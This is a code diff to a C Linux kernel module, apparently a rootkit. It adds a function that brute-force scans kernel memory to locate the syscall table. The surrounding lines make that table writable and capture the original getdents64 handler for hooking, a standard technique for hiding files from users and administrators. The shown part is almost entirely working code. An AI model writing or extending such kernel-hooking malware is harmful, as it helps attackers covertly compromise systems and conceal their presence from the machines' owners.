@@ -62,8 +62,33 @@ int set_page_rw(unsigned long addr, int f) {
   return 0;
 }
 
+uint64_t **get_table(void) {
+  uint64_t **sct;
+  uint64_t offset = PAGE_OFFSET;
+
+  while(offset < ULLONG_MAX) {
+    sct = (uint64_t**)offset;
+
+    if(sct[__NR_close] == (uint64_t*)ksys_close) {
+      printk("🍺 sys_call_table found at address: 0x%p\n", sct);
+      return sct;
+    }
+
+    offset += sizeof(void*);
+  }
+
+  return NULL;
+}
+
 int f_init(void) {
-  sys_call_table = (void*)0xffffffffb7c013a0;
+  uint64_t **a = get_table();
+
+  if(a == NULL) {
+    printk("⚠️ Failed to get sys_call_table addr\n");
+    return NULL;
+  }
+
+  sys_call_table = (void*)a;
 
   set_page_rw((uintptr_t)sys_call_table, 1);
   getdents64_original = sys_call_table[__NR_getdents64];
